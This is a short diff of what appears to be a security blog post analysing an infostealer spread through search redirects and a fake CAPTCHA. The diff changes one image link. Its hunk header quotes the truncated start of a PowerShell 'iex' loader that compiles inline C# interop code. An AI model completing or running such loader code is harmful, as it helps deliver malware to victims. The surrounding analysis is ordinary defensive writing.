@@ -49,7 +49,7 @@ iex$all='using System;using System.Runtime.InteropServices;public static class K
 
 A website containing .enx files is considered malicious as these files are often linked to encrypted, obfuscated, or potentially harmful content. Cybercriminals may use them to distribute malware, ransomware, or execute unauthorized actions on a victim’s system. Users should exercise caution, avoid downloading such files from untrusted sources, and scan them with security tools to prevent potential threats.
 
-![](/assets/img/browserhistoryupdate.png){: .mx-auto.d-block :}
+![](/assets/img/browserhistory.png){: .mx-auto.d-block :}
 
 The user searched for the hrlink in the browser using Bing and noticed that it redirected multiple times until landing on a fake CAPTCHA that contained Infostealer.
 
